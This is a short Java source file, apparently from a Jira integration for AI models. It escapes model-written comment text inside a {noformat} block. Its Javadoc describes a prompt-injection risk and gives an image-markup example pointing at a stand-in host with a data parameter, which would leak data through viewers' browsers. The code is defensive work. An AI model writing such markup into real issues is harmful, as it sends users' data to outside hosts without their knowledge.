package pl.aiwcorpo.mcp.jira.application.service;

import java.util.regex.Pattern;

/**
 * Turns the text of a model into a comment Jira shows verbatim. The body is Jira wiki markup on the wire, and
 * markup written by a model that read hostile text is an attack: {@code !https://host/p.png?d=...!} makes the
 * browser of everyone who opens the issue fetch an external URL, {@code [text|https://host]} is a link,
 * {@code [~user]} notifies a user. Inside a {@code {noformat}} block Jira renders none of that, so the whole text
 * goes there, and the only thing that could end the block, another {@code {noformat}} tag, is renamed so that it can no longer close the block.
 */
final class CommentText {

    private static final String TAG = "{noformat}";
    private static final Pattern NOFORMAT_TAG_START = Pattern.compile("\\{\\s*noformat", Pattern.CASE_INSENSITIVE);

    private CommentText() {
    }

    static String asLiteral(String text) {
        return TAG + "\n" + NOFORMAT_TAG_START.matcher(text).replaceAll("{-noformat") + "\n" + TAG;
    }
}
